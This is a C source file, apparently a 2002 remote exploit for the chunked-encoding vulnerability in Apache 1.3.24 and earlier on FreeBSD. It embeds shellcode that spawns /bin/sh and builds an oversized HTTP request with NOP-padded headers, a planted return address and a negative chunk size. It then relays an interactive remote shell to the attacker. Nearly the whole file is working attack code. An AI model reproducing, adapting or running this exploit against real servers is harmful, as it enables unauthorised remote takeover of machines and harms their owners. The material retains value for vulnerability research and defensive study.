/*
 apache <= 1.3.24 on FreeBSD / chunk handling vul remote exploit
 programmed by hsj  : 02.06.22

 notes:
  backward overrun. pretty nice. :)
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define OFFSET       0xffffff7a
#define RET          0x08129fc8
#define RET_OFF      914
#define NOP          0x41
#define PORT_OFF     46

/* bsd find socket shellcode with prompt :) (116 bytes) by hsj */
char shellcode[] =
"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5e\x83\xc6\x80\x89\xf4\x31"
"\xc9\xb1\x10\x89\x0e\x56\x8d\x7e\x04\x57\xb1\xff\x31\xc0\x51\x50"
"\xb0\x1f\xcd\x80\x59\x59\x85\xc0\x75\x08\x66\x81\x7f\x02\x34\x12"
"\x74\x04\xe2\xe8\xeb\x39\x89\xcb\x31\xc9\xb1\x03\x31\xc0\x49\x51"
"\x53\x50\xb0\x5a\xcd\x80\x58\x5b\x59\x41\xe2\xf0\x66\xb9\x2d\x69"
"\x51\x89\xe1\x31\xc0\x50\x68\x2f\x63\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x50\x51\x53\x89\xe1\x50\x51\x53\x50\xb0\x3b\xcd\x80\x31"
"\xc0\x40\xcd\x80";

int make_connection(char *address,int port)
{
    struct sockaddr_in server,target;
    struct hostent *host;
    int s,i,bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;
    memset((char *)&server,0,sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = 0;

    if(bind(s,(struct sockaddr *)&server,sizeof(server))<0)
    {
        close(s);
        return -2;
    }

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr==-1)
    {
        host = gethostbyname(address);
        if(host==0)
        {
            close(s);
            return -3;
        }
        memcpy(&(target.sin_addr),*(host->h_addr_list),host->h_length);
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctl(s,FIONBIO,&bf);
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        close(s);
        return -4;
    }
    if(i==0)
    {
        close(s);
        return -5;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        close(s);
        errno = bf;
        return -6;
    }
    ioctl(s,FIONBIO,&bf);
    return s;
}

int sh(int in,int out,int s)
{
    char sbuf[128],rbuf[128];
    int i,ti,fd_cnt,ret=0,slen=0,rlen=0;
    fd_set rd,wr;

    fd_cnt = in > out ? in : out;
    fd_cnt = s > fd_cnt ? s : fd_cnt;
    fd_cnt++;
    for(;;)
    {
        FD_ZERO(&rd);
        if(rlen<sizeof(rbuf))
            FD_SET(s,&rd);
        if(slen<sizeof(sbuf))
            FD_SET(in,&rd);

        FD_ZERO(&wr);
        if(slen)
            FD_SET(s,&wr);
        if(rlen)
            FD_SET(out,&wr);

        if((ti=select(fd_cnt,&rd,&wr,0,0))==(-1))
            break;
        if(FD_ISSET(in,&rd))
        {
            if((i=read(in,(sbuf+slen),(sizeof(sbuf)-slen)))==(-1))
            {
                ret = -2;
                break;
            }
            else if(i==0)
            {
                ret = -3;
                break;
            }
            slen += i;
            if(!(--ti))
                continue;
        }
        if(FD_ISSET(s,&wr))
        {
            if((i=write(s,sbuf,slen))==(-1))
                break;
            if(i==slen)
                slen = 0;
            else
            {
                slen -= i;
                memmove(sbuf,sbuf+i,slen);
            }
            if(!(--ti))
                continue;
        }
        if(FD_ISSET(s,&rd))
        {
            if((i=read(s,(rbuf+rlen),(sizeof(rbuf)-rlen)))<=0)
                break;
            rlen += i;
            if(!(--ti))
                continue;
        }
        if(FD_ISSET(out,&wr))
        {
            if((i=write(out,rbuf,rlen))==(-1))
                break;
            if(i==rlen)
                rlen = 0;
            else
            {
                rlen -= i;
                memmove(rbuf,rbuf+i,rlen);
            }
        }
    }
    return ret;
}

int main(int argc,char *argv[])
{
    int sock,i;
    struct sockaddr_in si;
    char *p,*cp,buf[8160],buf2[1024];

    if(argc<3)
    {
        fprintf(stderr,"usage :$ %s server-address port-no\n",argv[0]);
        return 0;
    }

    for(i=0;i<4;i++)
    {
        if((((RET>>(i*8))&0xff)=='\r')||(((RET>>(i*8))&0xff)=='\n'))
            break;
    }
    if(i!=4)
    {
        fprintf(stderr,"bad ret-addr.\n");
        return -1;
    }

    if(!(p=malloc((sizeof(buf)+sizeof(buf2)+32)*32+1024)))
    {
        fprintf(stderr,"can not alloc memory.\n");
        return -2;
    }

    sock = make_connection(argv[1],atoi(argv[2]));
    if(sock<0)
    {
        fprintf(stderr,"can not connect to %s.\n",argv[1]);
        return -3;
    }

    i = sizeof(struct sockaddr_in);
    if(getsockname(sock,(struct sockaddr *)&si,&i)==-1)
    {
        perror("getsockname");
        return -4;
    }

    for(i=0;i<2;i++)
    {
        if((((si.sin_port>>(i*8))&0xff)=='\r')||
           (((si.sin_port>>(i*8))&0xff)=='\n'))
            break;
    }
    if(i!=2)
    {
        fprintf(stderr,"bad client port-no.\n");
        return -5;
    }

    shellcode[PORT_OFF+0]=(unsigned char)((si.sin_port>>0)&0xff);
    shellcode[PORT_OFF+1]=(unsigned char)((si.sin_port>>8)&0xff);

    sprintf(p,"GET / HTTP/1.1\r\nHost: %s\r\n",argv[1]);
    cp = p + strlen(p);
    memset(buf,NOP,sizeof(buf));
    memcpy(buf+sizeof(buf)-strlen(shellcode)-1,shellcode,strlen(shellcode));
    buf[sizeof(buf)-1] = 0;
    for(i=0;i<32;i++)
    {
        sprintf(cp,"Shell_%03d: %s\r\n",i,buf);
        cp += strlen(cp);
    }
    memset(buf2,0,sizeof(buf2));
    buf2[RET_OFF+0] = (RET >>  0) & 0xff;
    buf2[RET_OFF+1] = (RET >>  8) & 0xff;
    buf2[RET_OFF+2] = (RET >> 16) & 0xff;
    buf2[RET_OFF+3] = (RET >> 24) & 0xff;
    buf2[sizeof(buf2)-2] = '\r';
    buf2[sizeof(buf2)-1] = '\n';
    for(i=0;i<32;i++)
    {
        sprintf(cp,"ZeroAndRet_%03d: ",i);
        cp += strlen(cp);
        memcpy(cp,buf2,sizeof(buf2));
        cp += sizeof(buf2);
    }
    sprintf(cp,"Transfer-Encoding: chunked\r\n\r\n%x\r\n",OFFSET);
    cp += strlen(cp);

    write(sock,p,cp-p);

    sh(0,1,sock);

    shutdown(sock,2);
    close(sock);

    return 0;
}

